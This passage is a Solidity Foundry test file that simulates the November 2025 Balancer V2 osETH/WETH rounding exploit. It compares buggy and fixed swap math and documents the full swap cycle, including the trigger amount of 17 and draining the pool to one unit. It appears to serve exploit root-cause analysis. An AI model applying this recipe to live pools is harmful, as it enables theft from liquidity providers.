// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../interface.sol";
import "../StableMath.sol";

// =============================================================================
// BalancerV2 ComposableStablePool osETH/WETH rounding exploit (Nov 2025, ~$120M)
// -----------------------------------------------------------------------------
// Diagnostic harness mirroring the offline math used by BalancerV2_exp.sol's
// prepare_phase2_steps, but logging D and (W, O) at every sub-step. Two modes:
//   (1) "buggy"  : exact replica of BaseGeneralPool._swapGivenOut --
//                  swapRequest.amount = mulDown(amount, sf[indexOut]).
//   (2) "fixed"  : OUT amount upscaled with mulUp instead of mulDown,
//                  removing the user-favouring truncation leak.
//
// =============================================================================
// VULNERABILITY ROOT CAUSE
// =============================================================================
// The rate-providing token osETH has scaling factor sf > 1e18 (~1.0581e18).
// BaseGeneralPool._swapGivenOut upscales the user-requested OUT amount with
// mulDown(amount, sf), which TRUNCATES. The Vault, however, decreases the
// raw OUT balance by `amount` exactly (no rounding) and later re-upscales
// with mulDown(balance, sf). The two paths can produce different upscaled
// post-state O values for the OUT token:
//
//   Curve view : O_up_post_curve = mulDown(O_pre, sf) - mulDown(amount, sf)
//   Vault view : O_up_post_vault = mulDown(O_pre - amount, sf)
//
// Their difference is the floor subadditivity defect:
//   gap = floor((a+b)*sf) - floor(a*sf) - floor(b*sf),  with a=amount, b=O_post_raw
// which is mathematically bounded to {0, 1}. The Curve uses O_up_post_curve
// in its Newton inverse-solver to derive the required amountIn that "preserves
// D". When gap=1, Curve solves on the WRONG D iso-curve (one O_up unit higher
// than reality), under-charging the user. Vault then settles at the truer,
// lower-O state, which lies BELOW the original D iso-curve -> D drops sharply.
//
// =============================================================================
// ATTACK FLOW (Phase 2, single A-B-C cycle)
// =============================================================================
//   Step A : WETH -> osETH (drain), out = (O_pre - trickAmt - 1)
//            Pushes pool to (W_A, trickAmt+1). With trickAmt=17 -> (374353, 18)
//            from initial (67000, 67000). Pre-state D = 138956.
//   Step B : WETH -> osETH (trigger), out = trickAmt = 17
//            Curve: O_up_pre = mulDown(18, sf) = 19,
//                   req_up   = mulDown(17, sf) = 17  (loses 0.988 upscaled),
//                   O_up_post_curve = 19 - 17 = 2.
//            Vault: O_raw_post = 18 - 17 = 1, O_up_post_vault = 1.
//            gap = curve(2) - vault(1) = 1.
//            Curve solves W on (D=138956, O_up=2) iso-curve -> 999845
//            (instead of the geometrically correct 1,415,765 for O_up=1).
//            Attacker pays amountIn = 625,492 W (vs 1,041,412 in FIXED),
//            i.e. UNDERPAYS by 415,920 W. Vault settles to (999845, 1)
//            which has measured D = 112,405, a -26,551 LOSS per cycle.
//   Step C : osETH -> WETH (recycle), restores most osETH but locks in the D loss
//            (the asymmetric mulDown defect does not fire on this leg).
//
// Repeated ~30+ times in the PoC, then converted into BPT arbitrage in Phase 3
// to extract the cumulated D-loss as actual token profit.
//
// =============================================================================
// WHY D DROPS SO MUCH (~26,551 per cycle, ~19% of pre-state D)
// =============================================================================
// The damage is the product of TWO independent factors:
//
// FACTOR 1: Rounding gap = 1 (the trigger).
//   Requires {trickAmt * sf} >= 1 - {sf} ~= 0.9419 (a 98.8%-coverage window).
//   trickAmt=17 satisfies it (frac = 0.988). PoC formula floor(1e18/(sf-1e18))
//   gives the smallest n in this window; equivalent gap=1 candidates exist
//   at 17, 34, 51, 68, 86, 103, ... The gap is hard-bounded to <=1 by the
//   floor subadditivity inequality, so this trigger is binary (0 or 1) and
//   cannot be amplified by tweaking trickAmt alone.
//
// FACTOR 2: Vault post-state O = 1 (the geometric amplifier).
//   At the boundary, dD/dO ~ D/(3*O), so O=1 maximises the per-unit-gap loss.
//   With D~138956: dD/dO @ O=1 ~ 46,318 (theoretical), measured ~26,551.
//   Step A's `-trickAmt - 1` formula is what pins vault_post O at exactly 1.
//   Without this pin, the same gap=1 at higher O collapses fast:
//     vault_O=1  -> |dD| =  26,551
//     vault_O=2  -> |dD| =  15,702
//     vault_O=3  -> |dD| =  11,372
//     vault_O=5  -> |dD| =   7,364
//     vault_O=13 -> |dD| =   2,688
//   Decay falls between 1/sqrt(O) and 1/O, matching D ~ W^(2/3)*O^(1/3)
//   evaluated along the trajectory.
//
// Equivalent formulation via the geometric law W ~ O^(-1/2) at fixed D:
//   At D=138,956 the FIXED swap targets (W=1,415,765, O=1) on the iso-curve;
//   the BUGGY swap (Newton on the wrong O_up=2 iso-curve) targets W=999,845.
//   Ratio = 1,415,765 / 999,845 ~= sqrt(2) ~= 1.414 (geometric requirement).
//   The 415,920 W shortfall = the W under-charge per cycle = attacker profit.
//
// =============================================================================
// EXPERIMENTAL FINDINGS (each backed by a testDiag_* in this file)
// =============================================================================
// 1. testDiag_diagramVerify
//    Every number in the BUGGY-vs-FIXED diagram is reproducible from on-chain
//    state + StableMath primitives, no inference needed:
//      sf[osETH] = 1.058132408689971699e18, sf[WETH] = 1e18, A = 200000,
//      fee = 1e14, Step A end (W=374353, O=18, D=138956),
//      O_up_pre=19, req_up=17, curve_post=2, vault_post=1, gap=1,
//      BUGGY end (W=999845, O=1, D=112405), FIXED end (W=1415765, O=1).
//
// 2. testDiag_dDdO_sweep / testDiag_gapAtDifferentO
//    The dominant damage factor is vault_O absolute value (= 1), not the
//    O/W ratio. Holding gap=1 fixed and pushing vault_O from 1 -> 13 collapses
//    |dD| by a factor of ~10. Holding W=999,845 and sweeping O from 1 -> 10000
//    (still O << W, ratio 1%) drops dD/dO from 27,727 to 6 -- a 4600x collapse.
//    "O << W" is necessary to enter the boundary regime; "O = 1" decides the
//    per-unit-gap amplification.
//
// 3. testDiag_gapMagnitudeAtVault1
//    Enumerated trickAmt = 1..200 with vault_post pinned at 1: max gap = 1
//    in every case (189 values give gap=0, 11 give gap=1, none give gap>=2).
//    This empirically confirms the floor subadditivity bound: a single
//    Step B mulDown rounding cannot produce (curve, vault) = (3,1) or (4,1).
//    PoC's (curve=2, vault=1) is the maximum constructible gap.
//
// 4. testDiag_trickAmtOptimum
//    All gap=1 trickAmt candidates {17, 34, 68, 86, 103, ...} are roughly
//    equivalent: |dD| in [25.3k, 27.0k], total cost in [918k, 940k], efficiency
//    in [26.9k, 29.4k] per unit cost. trickAmt=17 is NOT strictly optimal --
//    103 wins by ~3% on both |dD| and total cost. PoC chose 17 because it is
//    the SMALLEST positive solution of {n*sf} >= 0.9419, given by the clean
//    formula floor(1e18 / (sf - 1e18)) = 17 -- engineering simplicity, not
//    numerical optimality.
//
// 5. testDiag_newtonAsymmetry
//    StableMath has two Newton solvers with VERY different stability:
//      INVERSE  _getTokenBalanceGivenInvariantAndAllOtherBalances:
//        Solves a degree-2 polynomial in the unknown balance (S + D/Ann - D)*x
//        and -D^(N+1)/(Ann*n^n*P_others). Globally convergent (positive root
//        of a convex quadratic). Converges at every (D, O=1) point we tested.
//      FORWARD  _calculateInvariant:
//        Iterates D using D_P = D^(N+1)/(n^n * prod). At extreme imbalance
//        (e.g. O=1, W~1.4M) the cubic-in-D term blows up (D_P >> D),
//        Newton oscillates and reverts at sporadic points.
//    This is why FIXED simSwap completes (uses INVERSE Newton, which gives
//    W=1,415,765 cleanly) yet our post-hoc D check at (1,415,765, 1) reverts
//    -- the FORWARD solver fails on that exact point. Both BUGGY and FIXED
//    Step B amountIn are derived from the well-conditioned INVERSE solver.
//
// 6. testDiag_skipB / testDiag_skipA / testDiag_skipC
//    Removing Step B from the cycle eliminates the D drop entirely, while
//    Steps A and C alone roughly preserve D (only minor fee creep). This
//    isolates the leak as a Step-B-only phenomenon: A and C are auxiliary
//    geometric repositioning, the actual theft happens in Step B's rounding.
// =============================================================================

address constant balancer_d = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant osETH_wETH_d = 0xDACf5Fa19b1f720111609043ac67A9818262850c;

interface IPool {
    function getPoolId() external returns (bytes32);
    function getBptIndex() external returns (uint256);
    function getScalingFactors() external returns (uint256[] memory);
    function updateTokenRateCache(address) external;
    function getAmplificationParameter() external returns (uint256, bool, uint256);
    function getSwapFeePercentage() external returns (uint256);
}

contract DiagSim is Test {
    using FixedPoint for uint256;

    uint256 constant ONE = 1e18;

    function setUp() public {
        vm.createSelectFork("mainnet", 23717397 - 1);
        vm.warp(1762156007);
    }

    // ---- offline pool math (raw -> upscaled -> curve -> downscaled -> +fee) ----
    // mode == 0 : buggy   (mulDown on OUT amount = real on-chain behaviour)
    // mode == 1 : fixed   (mulUp on OUT amount, removes the user-favouring leak)
    function simSwapGivenOut(
        uint256[] memory bal,        // raw, length 2: [WETH, osETH]
        uint256[] memory sf,         // 18-dec scaling factors
        uint256 idxIn,
        uint256 idxOut,
        uint256 outAmt,              // raw out amount the user requests
        uint256 amp,
        uint256 fee,
        uint8 mode
    ) internal pure returns (uint256[] memory) {
        uint256 balIn = bal[idxIn];
        uint256 balOut = bal[idxOut];

        // Upscale balances: matches _upscaleArray (mulDown)
        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);

        // The defective line in BaseGeneralPool._swapGivenOut
        uint256 outUp = (mode == 0)
            ? outAmt.mulDown(sf[idxOut])   // truncates -> user-favouring leak
            : outAmt.mulUp(sf[idxOut]);    // counterfactual: no truncation

        uint256 inv = StableMath._calculateInvariant(amp, up);
        uint256 inUp = StableMath._calcInGivenOut(amp, up, idxIn, idxOut, outUp, inv);

        // Downscale IN with divUp, then add swap fee (divUp on (1 - fee))
        uint256 inRaw = inUp.divUp(sf[idxIn]);
        inRaw = inRaw.divUp(ONE - fee);

        bal[idxIn] = balIn + inRaw;
        bal[idxOut] = balOut - outAmt;
        return bal;
    }

    function invUp(uint256[] memory bal, uint256[] memory sf, uint256 amp)
        internal pure returns (uint256)
    {
        uint256[] memory up = new uint256[](2);
        up[0] = bal[0].mulDown(sf[0]);
        up[1] = bal[1].mulDown(sf[1]);
        return StableMath._calculateInvariant(amp, up);
    }

    function trim(uint256 n) internal pure returns (uint256) {
        if (n < 100) return n;
        uint256 b = n;
        uint256 p = 1;
        while (b > 100) { b /= 10; p *= 10; }
        return n / p * p;
    }

    // Variant where caller supplies trickAmt explicitly (instead of using the
    // sf-derived optimum 17). Logs W and O at every cycle end so we can compare
    // final balances side-by-side.
    function runScenarioTrick(uint8 mode, uint256 initBalance, uint256 cycles, uint256 trickAmtCustom) internal {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        uint256[] memory bal = new uint256[](2);
        bal[0] = initBalance;
        bal[1] = initBalance;
        uint256 amount = bal[1];

        emit log_named_string("=== mode", mode == 0 ? "BUGGY (mulDown)" : "FIXED (mulUp)");
        emit log_named_uint("trickAmt (custom)", trickAmtCustom);
        emit log_named_uint("init D", invUp(bal, sf, amp));

        for (uint256 r = 0; r < cycles; r++) {
            // Step A
            bal = simSwapGivenOut(bal, sf, 0, 1, amount - trickAmtCustom - 1, amp, fee, mode);
            // Step B
            bal = simSwapGivenOut(bal, sf, 0, 1, trickAmtCustom, amp, fee, mode);
            // Step C with retry-on-revert
            uint256 want = trim(bal[0]);
            bool ok = false;
            for (uint256 j = 0; j < 5; j++) {
                try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, mode) returns (uint256[] memory nb) {
                    bal = nb; ok = true; break;
                } catch { want = want * 9 / 10; }
            }
            if (!ok) { emit log_string("Step C failed all retries"); break; }
            emit log_named_uint("cycle", r);
            emit log_named_uint("  W", bal[0]);
            emit log_named_uint("  O", bal[1]);
            emit log_named_uint("  D", invUp(bal, sf, amp));
            amount = bal[1];
        }
    }

    // skipMask bits: 1=skip A, 2=skip B, 4=skip C
    function runScenarioSkip(uint8 mode, uint256 initBalance, uint256 cycles, uint8 skipMask) internal {
        bytes32 poolId = IPool(osETH_wETH_d).getPoolId();
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38); // osToken
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        // 2-token view: drop the BPT slot (index 1 in this pool).
        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0]; // WETH
        sf[1] = rawSf[2]; // osETH

        // trickAmt = floor(1e18 / (sf - 1e18)) for the OUT token (osETH here)
        uint256 trickAmt = ONE / (sf[1] - ONE);

        uint256[] memory bal = new uint256[](2);
        bal[0] = initBalance; // WETH raw
        bal[1] = initBalance; // osETH raw
        uint256 amount = bal[1];

        emit log_named_string("=== mode", mode == 0 ? "BUGGY (mulDown)" : "FIXED (mulUp)");
        emit log_named_uint("trickAmt (osETH raw)", trickAmt);
        emit log_named_uint("init D", invUp(bal, sf, amp));

        for (uint256 r = 0; r < cycles; r++) {
            if ((skipMask & 1) == 0) {
                bal = simSwapGivenOut(bal, sf, 0, 1, amount - trickAmt - 1, amp, fee, mode);
                emit log_named_uint("A D", invUp(bal, sf, amp));
            }
            if ((skipMask & 2) == 0) {
                bal = simSwapGivenOut(bal, sf, 0, 1, trickAmt, amp, fee, mode);
                emit log_named_uint("B D", invUp(bal, sf, amp));
            }
            if ((skipMask & 4) == 0) {
                uint256 want = trim(bal[0]);
                bool ok = false;
                for (uint256 j = 0; j < 5; j++) {
                    try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, mode) returns (uint256[] memory nb) {
                        bal = nb; ok = true; break;
                    } catch { want = want * 9 / 10; }
                }
                if (!ok) { emit log_string("Step C failed all retries"); break; }
                emit log_named_uint("C D", invUp(bal, sf, amp));
            }
            emit log_string("---");
            amount = bal[1];
        }
    }

    function runScenario(uint8 mode, uint256 initBalance, uint256 cycles) internal {
        runScenarioSkip(mode, initBalance, cycles, 0);
    }

    function ext_simSwap(
        uint256[] memory bal, uint256[] memory sf,
        uint256 idxIn, uint256 idxOut, uint256 outAmt,
        uint256 amp, uint256 fee, uint8 mode
    ) external pure returns (uint256[] memory) {
        return simSwapGivenOut(bal, sf, idxIn, idxOut, outAmt, amp, fee, mode);
    }

    function testDiag_buggy() public {
        runScenario(0, 67000, 6);
    }

    function testDiag_fixed() public {
        runScenario(1, 67000, 6);
    }

    // Only A + C, skip B (mask = 0b010 = 2)
    function testDiag_skipB() public {
        runScenarioSkip(0, 67000, 6, 2);
    }

    // Only B + C, skip A (mask = 0b001 = 1)
    function testDiag_skipA() public {
        runScenarioSkip(0, 67000, 6, 1);
    }

    // Only A + B, skip C (mask = 0b100 = 4)
    function testDiag_skipC() public {
        runScenarioSkip(0, 67000, 6, 4);
    }

    // Real attack: trickAmt = 17 (sf-derived optimum, max leak per swap)
    function testDiag_trick17() public {
        runScenarioTrick(0, 67000, 6, 17);
    }

    // Counterfactual: trickAmt = 1 (smallest possible, leak ≈ 0.058 upscaled units per swap)
    function testDiag_trick1() public {
        runScenarioTrick(0, 67000, 6, 1);
    }

    // Directly measure D at the three concrete (W, O) points the bug walkthrough
    // claims, instead of inferring them. Also runs the FIXED (mulUp) variant of
    // Step B to measure the actual amountIn / final state for comparison.
    function testDiag_verifyClaims() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        // Direct D measurements at the three claimed points.
        uint256[] memory p_A = new uint256[](2);
        p_A[0] = 374353; p_A[1] = 18;
        uint256[] memory p_hyp = new uint256[](2);
        p_hyp[0] = 999845; p_hyp[1] = 2;
        uint256[] memory p_real = new uint256[](2);
        p_real[0] = 999845; p_real[1] = 1;

        emit log_string("=== direct D measurement at three points ===");
        emit log_named_uint("D at (374353, 18)  [Step A end, measured]", invUp(p_A, sf, amp));
        emit log_named_uint("D at (999845, 2)   [post-fee hyp]        ", invUp(p_hyp, sf, amp));
        emit log_named_uint("D at (999845, 1)   [Vault real end]      ", invUp(p_real, sf, amp));

        // The "real" hypothetical the curve solves for is the PRE-fee state.
        // Reconstruct it: inUp_preFee = inRaw_paid * (1 - fee), since sf[W] = 1.
        emit log_string("=== reconstruct pre-fee hypothetical (curve's true target) ===");
        emit log_named_uint("swap fee (1e18)", fee);
        uint256 inRaw_paid = 625492;                                  // measured
        uint256 inUp_preFee = inRaw_paid * (ONE - fee) / ONE;          // back out pre-fee
        uint256 W_preFee_hyp = 374353 + inUp_preFee;
        emit log_named_uint("inRaw paid (with fee)", inRaw_paid);
        emit log_named_uint("inUp pre-fee (curve's solution)", inUp_preFee);
        emit log_named_uint("W_preFee hypothetical = W_pre + inUp_preFee", W_preFee_hyp);

        // Sweep D along the (W, O=2) line near the curve's true hypothetical
        emit log_string("=== D sweep along O=2, varying W ===");
        uint256[16] memory Ws = [
            uint256(500000), 800000, 950000, 999000, 999500, 999700,
            999782, 999800, 999820, 999845, 999900, 1000000,
            1010000, 1050000, 1100000, 1200000
        ];
        for (uint256 i = 0; i < Ws.length; i++) {
            uint256[] memory pp = new uint256[](2);
            pp[0] = Ws[i]; pp[1] = 2;
            try this.ext_invUp(pp, sf, amp) returns (uint256 d) {
                emit log_named_uint(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=2")), d);
            } catch {
                emit log_named_string(string(abi.encodePacked("  D at W=", _u(Ws[i]), ", O=2")), "REVERT");
            }
        }

        // Now FIXED Step B: same Step A start, but use mulUp on OUT amount.
        emit log_string("=== FIXED (mulUp) Step B from same Step A end ===");
        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000; bal[1] = 67000;
        bal = simSwapGivenOut(bal, sf, 0, 1, 67000 - 17 - 1, amp, fee, 0); // Step A (buggy mode is fine here, A doesn't trip the leak)
        emit log_named_uint("after Step A: W", bal[0]);
        emit log_named_uint("after Step A: O", bal[1]);
        emit log_named_uint("after Step A: D", invUp(bal, sf, amp));

        uint256 W_pre = bal[0];
        uint256 D_pre = invUp(bal, sf, amp);
        // FIXED: mulUp on OUT
        uint256[] memory balF = _copy(bal);
        balF = simSwapGivenOut(balF, sf, 0, 1, 17, amp, fee, 1);
        emit log_named_uint("FIXED Step B: amountIn paid", balF[0] - W_pre);
        emit log_named_uint("FIXED Step B: W_post", balF[0]);
        emit log_named_uint("FIXED Step B: O_post", balF[1]);
        try this.ext_invUp(balF, sf, amp) returns (uint256 d) {
            emit log_named_uint("FIXED Step B: D_post", d);
            emit log_named_int("FIXED Step B: dD", int256(d) - int256(D_pre));
        } catch {
            emit log_string("FIXED Step B: D_post = REVERT (invariant didn't converge)");
        }

        // BUGGY for direct comparison
        uint256[] memory balB = _copy(bal);
        balB = simSwapGivenOut(balB, sf, 0, 1, 17, amp, fee, 0);
        emit log_named_uint("BUGGY Step B: amountIn paid", balB[0] - W_pre);
        emit log_named_uint("BUGGY Step B: W_post", balB[0]);
        emit log_named_uint("BUGGY Step B: O_post", balB[1]);
        uint256 d_buggy = invUp(balB, sf, amp);
        emit log_named_uint("BUGGY Step B: D_post", d_buggy);
        emit log_named_int("BUGGY Step B: dD", int256(d_buggy) - int256(D_pre));
    }

    function ext_invUp(uint256[] memory bal, uint256[] memory sf, uint256 amp)
        external pure returns (uint256)
    {
        return invUp(bal, sf, amp);
    }

    function _u(uint256 n) internal pure returns (string memory) {
        return vm.toString(n);
    }

    // Full A/B/C step trace: print D, W, O before and after each sub-step
    // for `cycles` cycles. Lets us see how Step A and Step C move D vs Step B.
    function testDiag_stepTrace_trick17() public {
        _stepTrace(17, 67000, 3);
    }

    function testDiag_stepTrace_trick1() public {
        _stepTrace(1, 67000, 2);
    }

    function _stepTrace(uint256 trickAmt, uint256 initBalance, uint256 cycles) internal {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        uint256[] memory bal = new uint256[](2);
        bal[0] = initBalance;
        bal[1] = initBalance;
        uint256 amount = bal[1];

        emit log_named_uint("trickAmt", trickAmt);
        _logState("init", bal, sf, amp);

        for (uint256 r = 0; r < cycles; r++) {
            emit log_string("==========================================");
            emit log_named_uint("cycle", r);

            // ---- Step A ----
            uint256 D_pre = invUp(bal, sf, amp);
            uint256[] memory bal_pre_A = _copy(bal);
            bal = simSwapGivenOut(bal, sf, 0, 1, amount - trickAmt - 1, amp, fee, 0);
            uint256 D_post = invUp(bal, sf, amp);
            emit log_string("--- Step A (WETH -> osETH, drain to trickAmt+1) ---");
            emit log_named_int("  Step A: dW", int256(bal[0]) - int256(bal_pre_A[0]));
            emit log_named_int("  Step A: dO", int256(bal[1]) - int256(bal_pre_A[1]));
            emit log_named_int("  Step A: dD", int256(D_post) - int256(D_pre));
            _logState("  after A", bal, sf, amp);

            // ---- Step B ----
            D_pre = D_post;
            uint256[] memory bal_pre_B = _copy(bal);
            bal = simSwapGivenOut(bal, sf, 0, 1, trickAmt, amp, fee, 0);
            D_post = invUp(bal, sf, amp);
            emit log_string("--- Step B (WETH -> osETH, take trickAmt) ---");
            emit log_named_int("  Step B: dW", int256(bal[0]) - int256(bal_pre_B[0]));
            emit log_named_int("  Step B: dO", int256(bal[1]) - int256(bal_pre_B[1]));
            emit log_named_int("  Step B: dD", int256(D_post) - int256(D_pre));
            _logState("  after B", bal, sf, amp);

            // ---- Step C ----
            D_pre = D_post;
            uint256[] memory bal_pre_C = _copy(bal);
            uint256 want = trim(bal[0]);
            bool ok = false;
            for (uint256 j = 0; j < 5; j++) {
                try this.ext_simSwap(bal, sf, 1, 0, want, amp, fee, 0) returns (uint256[] memory nb) {
                    bal = nb; ok = true; break;
                } catch { want = want * 9 / 10; }
            }
            if (!ok) { emit log_string("Step C failed all retries"); break; }
            D_post = invUp(bal, sf, amp);
            emit log_string("--- Step C (osETH -> WETH, recycle) ---");
            emit log_named_int("  Step C: dW", int256(bal[0]) - int256(bal_pre_C[0]));
            emit log_named_int("  Step C: dO", int256(bal[1]) - int256(bal_pre_C[1]));
            emit log_named_int("  Step C: dD", int256(D_post) - int256(D_pre));
            _logState("  after C", bal, sf, amp);

            amount = bal[1];
        }
    }

    function _logState(string memory tag, uint256[] memory bal, uint256[] memory sf, uint256 amp) internal {
        emit log_named_string("state", tag);
        emit log_named_uint("    W", bal[0]);
        emit log_named_uint("    O", bal[1]);
        emit log_named_uint("    D", invUp(bal, sf, amp));
    }

    function _copy(uint256[] memory a) internal pure returns (uint256[] memory b) {
        b = new uint256[](a.length);
        for (uint256 i = 0; i < a.length; i++) b[i] = a[i];
    }

    // Focused on Step B: log curve-view vs vault-view post-state for both trickAmts.
    // We isolate Step B by first running Step A, then capturing pre-state, then
    // doing Step B and reporting the discrepancy.
    function testDiag_stepB_compare() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        emit log_named_uint("scaling factor osETH (sf)", sf[1]);

        _stepBCompareOne(sf, amp, fee, 17);
        emit log_string("==========================================");
        _stepBCompareOne(sf, amp, fee, 1);
        emit log_string("==========================================");
        _stepBCompareOne(sf, amp, fee, 34);
        emit log_string("==========================================");
        _stepBCompareOne(sf, amp, fee, 170);
    }

    function _stepBCompareOne(uint256[] memory sf, uint256 amp, uint256 fee, uint256 trickAmt) internal {
        // Run Step A from (67000, 67000) to (W_A, trickAmt + 1)
        uint256[] memory bal = new uint256[](2);
        bal[0] = 67000;
        bal[1] = 67000;
        bal = simSwapGivenOut(bal, sf, 0, 1, 67000 - trickAmt - 1, amp, fee, 0);

        emit log_named_uint("trickAmt", trickAmt);
        emit log_named_uint("after Step A: W_raw", bal[0]);
        emit log_named_uint("after Step A: O_raw", bal[1]);
        emit log_named_uint("after Step A: O_up = floor(O_raw * sf)", bal[1].mulDown(sf[1]));
        emit log_named_uint("after Step A: D_pre", invUp(bal, sf, amp));

        // Capture exactly what Step B's curve view does internally
        uint256 O_up_pre = bal[1].mulDown(sf[1]);
        uint256 request_up_mulDown = trickAmt.mulDown(sf[1]); // BUGGY truncation
        uint256 O_up_post_curve = O_up_pre - request_up_mulDown;
        emit log_named_uint("Step B request_up = mulDown(trickAmt, sf)", request_up_mulDown);
        emit log_named_uint("Step B 'curve assumed' O_up_post", O_up_post_curve);

        // Execute Step B
        uint256 W_pre = bal[0];
        bal = simSwapGivenOut(bal, sf, 0, 1, trickAmt, amp, fee, 0);
        uint256 W_post = bal[0];
        uint256 O_raw_post = bal[1];
        uint256 O_up_post_vault = O_raw_post.mulDown(sf[1]);
        emit log_named_uint("after Step B: W_raw", W_post);
        emit log_named_uint("after Step B: amountIn paid (W gain)", W_post - W_pre);
        emit log_named_uint("after Step B: O_raw", O_raw_post);
        emit log_named_uint("after Step B: O_up (Vault, re-upscaled)", O_up_post_vault);
        try this.ext_invUp(bal, sf, amp) returns (uint256 d) {
            emit log_named_uint("after Step B: D (measured on real balances)", d);
        } catch {
            emit log_string("after Step B: D = REVERT (invariant didn't converge)");
        }

        // Discrepancy: curve thought O_up_post = X, Vault gives Y
        if (O_up_post_curve > O_up_post_vault) {
            emit log_named_uint("integer discrepancy in O_up", O_up_post_curve - O_up_post_vault);
        } else {
            emit log_named_uint("integer discrepancy in O_up", 0);
        }
    }

    // Decouple "O << W" from "O small in absolute value":
    // Fix W = 999845, sweep O over many magnitudes, measure D and dD/dO (secant).
    function testDiag_dDdO_sweep() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();

        uint256[10] memory Os = [uint256(1), 2, 10, 100, 1000, 10000, 100000, 333281, 666563, 999845];
        for (uint256 i = 0; i < Os.length; i++) {
            uint256 O = Os[i];
            emit log_named_uint("--- O", O);
            emit log_named_uint("  ratio O/W * 1e6", (O * 1e6) / 999845);
            (bool ok1, uint256 D_here) = _safeInv(amp, 999845, O);
            (bool ok2, uint256 D_plus) = _safeInv(amp, 999845, O + 1);
            if (!ok1) { emit log_string("  D(W,O)        : NEWTON DIVERGED"); continue; }
            emit log_named_uint("  D(W,O)        ", D_here);
            if (!ok2) { emit log_string("  D(W,O+1)      : NEWTON DIVERGED"); continue; }
            int256 slope = int256(D_plus) - int256(D_here);
            emit log_named_int("  dD/dO (secant +1)", slope);
            emit log_named_uint("  geom D/(3O)   ", D_here / (3 * O));
        }
    }

    function _safeInv(uint256 amp, uint256 W, uint256 O) internal returns (bool, uint256) {
        uint256[] memory up = new uint256[](2);
        up[0] = W; up[1] = O;
        try this.ext_inv(amp, up) returns (uint256 d) { return (true, d); }
        catch { return (false, 0); }
    }

    function ext_inv(uint256 amp, uint256[] memory up) external pure returns (uint256) {
        return StableMath._calculateInvariant(amp, up);
    }

    // Decouple "1-unit integer gap" from "post-state O = 1".
    // Same trickAmt = 17 (always satisfies the threshold), but Step A drains to
    // different O_target, so Step B leaves the pool at different absolute O.
    // If user's claim is right (O=1 is incidental), ΔD should be similar across
    // O_target values. If our model is right (O=1 absolute matters), ΔD should
    // collapse as O_target grows, even though gap stays = 1.
    function testDiag_gapSameButO_diff() public {
        IPool(osETH_wETH_d).updateTokenRateCache(0xf1C9acDc66974dFB6dEcB12aA385b9cD01190E38);
        uint256[] memory rawSf = IPool(osETH_wETH_d).getScalingFactors();
        (uint256 amp,,) = IPool(osETH_wETH_d).getAmplificationParameter();
        uint256 fee = IPool(osETH_wETH_d).getSwapFeePercentage();

        uint256[] memory sf = new uint256[](2);
        sf[0] = rawSf[0];
        sf[1] = rawSf[2];

        uint256[6] memory O_target = [uint256(18), 100, 500, 1000, 5000, 10000];
        uint256 trickAmt = 17;
        for (uint256 i = 0; i < O_target.length; i++) {
            emit log_string("==== Step A drains to O_target ====");
            emit log_named_uint("  O_target (Step A end O_raw)", O_target[i]);

            uint256[] memory bal = new uint256[](2);
            bal[0] = 67000; bal[1] = 67000;
            // Step A: drain (67000 - O_target) osETH out
            try this.ext_simSwap(bal, sf, 0, 1, 67000 - O_target[i], amp, fee, 0) returns (uint256[] memory nb) {
                bal = nb;
            } catch { emit log_string("  Step A REVERT"); continue; }

            uint256 W_A = bal[0];
            uint256 O_A = bal[1];
            (bool okPre, uint256 D_pre) = _safeInv(amp, W_A.mulDown(sf[0]), O_A.mulDown(sf[1]));
            emit log_named_uint("  Step A done: W_A", W_A);
            emit log_named_uint("  Step A done: O_A", O_A);
            if (okPre) emit log_named_uint("  Step A done: D_pre", D_pre);

            // Compute curve view of Step B post-state
            uint256 O_up_pre = O_A.mulDown(sf[1]);
            uint256 req_up = trickAmt.mulDown(sf[1]);
            uint256 O_up_post_curve = O_up_pre - req_up;

            // Step B
